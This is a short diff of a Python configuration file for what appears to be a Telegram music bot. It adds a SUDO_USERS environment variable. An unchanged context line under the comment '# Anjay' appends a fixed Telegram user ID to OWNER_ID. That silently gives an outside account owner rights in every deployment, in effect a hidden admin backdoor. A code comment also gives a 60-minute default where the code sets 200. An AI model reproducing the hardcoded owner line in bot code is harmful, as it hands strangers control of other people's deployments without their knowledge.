@@ -26,6 +26,7 @@ BOT_TOKEN = getenv("BOT_TOKEN")
 # Database to save your chats and stats... Get MongoDB:-  https://telegra.ph/How-To-get-Mongodb-URI-04-06
 MONGO_DB_URI = getenv("MONGO_DB_URI", None)
 ASSISTANT_PREFIX = list(getenv("ASSISTANT_PREFIX", ".").split())
+
 # Custom max audio(music) duration for voice chat. set DURATION_LIMIT in variables with your own time(mins), Default to 60 mins.
 DURATION_LIMIT_MIN = int(
     getenv("DURATION_LIMIT", "200")
@@ -47,6 +48,7 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
+SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
 
 # Anjay
 OWNER_ID.append(1784606556)
